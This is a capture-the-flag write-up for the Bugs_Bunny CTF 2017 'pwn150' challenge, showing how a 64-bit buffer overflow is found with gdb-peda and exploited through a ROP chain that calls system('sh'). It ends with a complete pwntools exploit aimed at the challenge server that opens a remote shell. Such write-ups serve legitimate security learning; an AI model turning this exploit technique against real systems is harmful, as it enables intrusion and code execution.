---
title: Bugs_Bunny CTF 2017 -Pwn150
subtitle: s
date: 2017-03-07
tags: ["Posts",Bugs_bunny CTF", "Pwn"]
---


Hello guys, This writeup is for  _ the bugs_bunny CTF 2017 _ pwn series.  


challenge: **pwn150**


first 3 steps:

1. file :

![image](/img/pwn150/1.png)

2. strings :

![image](/img/pwn150/2.png)

3. checksec :

![image](/img/pwn150/3.png)



Informations Gathered:  
&nbsp;	Its a 64-bit binary with NX enabled and the elf contains `"/bin/date"` and a call to `system()`  
&nbsp;	Two functions other than main: Hello and today.


why it matters:  
	* 64-bit		:	Parameters have to be passed in registers. Register's size is 64-bit (Too obvious :P)
	* NX-enabled 	:   Typical shellcode on stack wont work as the Stack is no longer Executable. 


now, we run the binary:

`./pwn150`

![image](/img/pwn150/4.png)


oh, seems like we are given a buffer overflow again. :(


`objdump -d pwn150 -M intel`

![image](/img/pwn150/5.png)


ok, so today function gives date and hence uses `system("/bin/date")` and Hello gets the input.


now lets fire my fav gdb-peda,


`gdb -q pwn150`


`b main`  
`b Hello`  
`pattern_create 150`  

![image](/img/pwn150/6.png)


Now, all set to run the binary and find the offset to RIP  
r  
oh, its exits :( but why??, i expected it to break at Hello, without that how can i get the offset	

![image](/img/pwn150/7.png)


ok, when in trouble, google should help, if not satisfied then ask your teammates.


My senior, @jenish said,a call to `system()` forks the process and gdb follows the child process by default and hence i had to set it in parent mode


`show follow-fork-mode #gives child  
set follow-fork-mode parent`
r

![image](/img/pwn150/8.png)

enter input fron pattern_create



<figure>
	<a href="/img/pwn150/9.png"><img src="/img/pwn150/9.png"></a>
	
</figure>



oh cool, the offset for RBP is 80 and hence for RIP its 88.


Data at hand:
	
1. Buffer Overflow
2. RIP offset=88
3. system() is called.
4. so, if i have /bin/sh in elf, its a one shot ROP challenge. Let me check this out

```python
from pwn import *
elf=ELF('pwn150')
hex(elf.search('/bin/sh').next())#fail
hex(elf.search('/bin/bash').next())#fail
hex(elf.search('sh').next())#success
```

![image](/img/pwn150/10.png)


Final plan:


1. Fill buffer and overwrite RBP with "A"*80+"B"*8 
2. Overwrite RIP with ROP gadget "pop rdi;ret"
3. then put pointer to sh on stack
4. with rdi having pointer to sh, call system()
5. that should suffice


finding the ROP gadgets can be done with ROPgadget or the powerful pwntools.


![image](/img/pwn150/12.png)


Final exploit:
```python

from pwn import *

system=0x40075f			# call system
pop_ret=0x0400883 		# pop edi; ret
sh=0x4003ef				# "sh" in elf
pay="A"*88
pay+=p64(pop_ret)
pay+=p64(sh)
pay+=p64(system)
#print pay

#r=process('./pwn150')
r=remote('54.67.102.66','5253')
r.recv()
r.send(pay)
r.interactive()

#r.sendline("cat /home/pwn150/flag")

#Bugs_Bunny{did_i_help_you_Solve_it!oHH_talk_to_hacker:D}

```

![image](/img/pwn150/11.png)